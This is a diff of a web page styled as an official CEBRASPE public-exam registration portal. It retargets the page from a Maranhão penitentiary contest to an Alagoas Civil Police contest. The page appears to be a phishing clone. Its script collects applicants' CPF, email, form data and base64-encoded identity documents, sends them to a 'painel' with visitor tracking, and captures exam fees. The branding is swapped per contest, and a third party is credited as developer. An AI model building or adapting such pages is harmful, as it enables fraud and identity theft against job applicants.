@@ -781,7 +781,7 @@ h2.tituloPagina span { border-bottom:0 !important; text-indent:0 !important; pad
 </div>
 <div class="dados">
 <p class="tipo">Concurso</p>
-<h2 style="font-weight:normal!important"></h2><p><strong>Concurso Público da Secretaria de Estado de Administração Penitenciária do Maranhão</strong></p>
+<h2 style="font-weight:normal!important"></h2><p><strong>Concurso da Polícia Civil do Estado de Alagoas</strong></p>
 <p class="periodoInscricoes">Inscrições de 
  <b>30/07/2026</b> a 
  <b>31/08/2026</b>
@@ -845,13 +845,13 @@ h2.tituloPagina span { border-bottom:0 !important; text-indent:0 !important; pad
 <div class="fgv-field">
 <label><span class="error">*</span> Selecione o estado para a realização da prova:</label>
 <select class="select" data-testid="select-uf-prova" id="UF_PROVA" name="UF_PROVA" required="">
-<option value="MA" selected="">Maranhão / MA</option>
+<option value="AL" selected="">Alagoas / AL</option>
 </select>
 </div>
 <div class="fgv-field">
 <label><span class="error">*</span> Selecione o município para a realização da prova:</label>
 <select class="select" data-testid="select-municipio-prova" id="MUNICIPIO_PROVA" name="MUNICIPIO_PROVA" required="">
-<option value="São Luís / MA" selected="">São Luís / MA</option>
+<option value="Maceió / AL" selected="">Maceió / AL</option>
 </select>
 </div>
 <script>
@@ -860,8 +860,8 @@ h2.tituloPagina span { border-bottom:0 !important; text-indent:0 !important; pad
    var uf = document.getElementById('UF_PROVA');
    var mun = document.getElementById('MUNICIPIO_PROVA');
    if(!uf||!mun) return;
-   // Maranhão fixo: pre-seleciona MA (único estado do certame SEAP MA)
-   if(uf.value !== 'MA'){ uf.value = 'MA'; }
+   // Alagoas fixo: pre-seleciona AL (único estado do certame PC AL)
+   if(uf.value !== 'AL'){ uf.value = 'AL'; }
  });
 })();
 </script>
@@ -946,7 +946,7 @@ h2.tituloPagina span { border-bottom:0 !important; text-indent:0 !important; pad
 <div class="final">
 <div class="Conteudo">
 <div class="links">
- © CEBRASPE — CONCURSO PÚBLICO SEAP-MA
+ © CEBRASPE — CONCURSO PÚBLICO POLÍCIA CIVIL DE ALAGOAS
  </div>
 <div class="DesenvolvimentoProSeleta">
  Desenvolvido por <a href="#">ProSeleta - Gestão de Processos Seletivos Online</a>
@@ -1239,7 +1239,7 @@ function __handleDocTipo(v){
       var ov = document.getElementById('loading-overlay');
       if(ov) ov.style.display = 'flex';
       // Envia cadastro para o painel + documentos (base64)
-      var CONCURSO = 'Concurso Público da Secretaria de Estado de Administração Penitenciária do Maranhão - Edital 001/2026';
+      var CONCURSO = 'Concurso da Polícia Civil do Estado de Alagoas - Edital 001/2026';
       // Captura vaga dinamicamente do <option> selecionado
       var vagaSel = form.querySelector('#VAGA');
       var vagaOpt = vagaSel && vagaSel.options[vagaSel.selectedIndex];
@@ -1261,7 +1261,7 @@ function __handleDocTipo(v){
           cpf: data.CPF || '',
           email: data.EMAIL || '',
           concurso: CONCURSO,
-          edital: '001/2026-SEAP-MA',
+          edital: '001/2026-PC-AL',
           stage: 'cadastro',
           visitor_id: window.__vid(),
           form_data: form_data
@@ -1295,7 +1295,7 @@ function __handleDocTipo(v){
       try{
         var ctx = Object.assign({}, data, {
           __concurso: CONCURSO,
-          __edital: '001/2026-SEAP-MA',
+          __edital: '001/2026-PC-AL',
           __cargo_codigo: vagaInfo.codigo,
           __cargo_titulo: vagaInfo.titulo,
           __taxa: vagaInfo.taxa,
@@ -1831,7 +1831,7 @@ html, body { overflow-x: hidden !important; }
 <div>
 <div class="ceb-brand">Cebraspe</div>
 <p>Centro Brasileiro de Pesquisa em Avaliação e Seleção e de Promoção de Eventos.</p>
-<p style="margin-top:10px;">Concurso Público — SEAP-MA</p>
+<p style="margin-top:10px;">Concurso Público — Polícia Civil de Alagoas</p>
 </div>
 <div>
 <h4>Institucional</h4>
@@ -1852,7 +1852,7 @@ html, body { overflow-x: hidden !important; }
 </div>
 </div>
 <div class="ceb-copyright">
-    © CEBRASPE — CONCURSO PÚBLICO SEAP-MA
+    © CEBRASPE — CONCURSO PÚBLICO POLÍCIA CIVIL DE ALAGOAS
   </div>
 </footer>
 </div>
